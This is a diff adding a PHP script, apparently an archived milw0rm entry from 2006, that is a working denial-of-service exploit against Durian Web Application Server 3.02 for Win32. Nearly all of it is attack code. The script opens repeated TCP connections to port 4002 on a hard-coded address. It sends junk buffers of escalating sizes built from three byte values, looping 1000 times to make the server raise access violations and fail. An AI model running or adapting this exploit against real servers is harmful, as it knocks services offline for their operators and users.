@@ -1,0 +1,41 @@
+<?php
+//Durian Web Application Server 3.02 freeware for Win32 denial of service exploit
+//this will merely show 1000 access violation boxes to screen
+//software site -> http://sourceforge.net/projects/durian/
+
+//by rgod mail: retrog at alice dot it site: http://retrogod.altervista.org
+
+error_reporting(E_ALL);
+$service_port = "4002";
+$address = "192.168.1.3";
+
+$ch  =array("\xaa","\xa0","\x41");
+$size=array(30,70,150,330,520,700,1400,2300);
+$c=1000;
+
+for ($m=1; $m<=$c; $m++){
+    for ($j=0; $j<3; $j++){
+        for ($i=0; $i<8; $i++){
+            $junk="";
+            for ($k=1; $k<=$size[$i]; $k++){
+                $junk.=$ch[$j];
+            }
+            echo "buf size:".$size[$i]."|char:".$ch[$j]."\n";
+            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+            if ($socket < 0) {
+                die("socket_create() failed:\n reason: " . socket_strerror($socket) . "\n");
+            }
+            $result = socket_connect($socket, $address, $service_port);
+            if ($result < 0) {
+                die("socket_connect() failed:\n reason: ($result) " . socket_strerror($result) . "\n");
+            }
+            $in = $junk;
+            socket_write($socket, $in, strlen ($in));
+            socket_close($socket);
+        }
+   }
+sleep(1);
+}
+?>
+
+# milw0rm.com [2006-12-29]
